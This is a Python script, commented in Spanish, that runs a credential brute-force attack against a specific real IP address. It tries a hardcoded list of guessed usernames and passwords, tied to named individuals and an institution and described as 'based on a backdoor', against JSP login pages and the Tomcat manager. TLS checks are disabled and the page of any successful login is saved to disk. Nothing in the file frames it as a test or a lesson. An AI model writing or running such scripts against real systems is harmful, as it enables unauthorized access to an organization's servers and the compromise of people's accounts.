#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings()

def intelligent_brute_force():
    target = "https://189.254.143.102"
    session_id = "00000000000000000000000000000000"
    
    # Credenciales BASADAS EN BACKDOOR y contexto UTSLP
    credentials = [
        ("tono", "SITO"), ("jose", "UTSLP"), ("admin", "SITO"),
        ("tono", "utslp"), ("jose", "sito"), ("admin", "utslp"),
        ("tono", "Utslp2024"), ("jose", "Utslp2024"), 
        ("sito", "SITO"), ("utslp", "UTSLP"),
        ("tono", "ISCT2010"), ("jose", "ISCT2010"),
        ("danyel", "Spr@nch2010"), ("dnylsp", "SpRanch"),
        ("manager", "manager"), ("tomcat", "tomcat")
    ]
    
    session = requests.Session()
    session.cookies.set('JSESSIONID', session_id)
    session.verify = False
    
    print("=== FUERZA BRUTA INTELIGENTE ===")
    
    for username, password in credentials:
        # Probar en endpoints de login conocidos
        login_data = {
            'usuario': username,
            'password': password,
            'xUsuario': username,
            'xContrasena': password
        }
        
        for endpoint in ['/jsp/login.jsp', '/jsp/menu.jsp', '/manager/html']:
            try:
                r = session.post(f"{target}{endpoint}", data=login_data, timeout=5)
                if r.status_code == 200 and "error" not in r.text.lower():
                    if "bienvenido" in r.text.lower() or "welcome" in r.text.lower():
                        print(f"✅ LOGIN EXITOSO: {username}:{password} en {endpoint}")
                        with open(f"login_success_{username}.html", "w") as f:
                            f.write(r.text)
                elif "invalid" not in r.text.lower() and "error" not in r.text.lower():
                    print(f"⚠️  Respuesta inusual con {username}:{password} en {endpoint}")
            except:
                pass

if __name__ == "__main__":
    intelligent_brute_force()
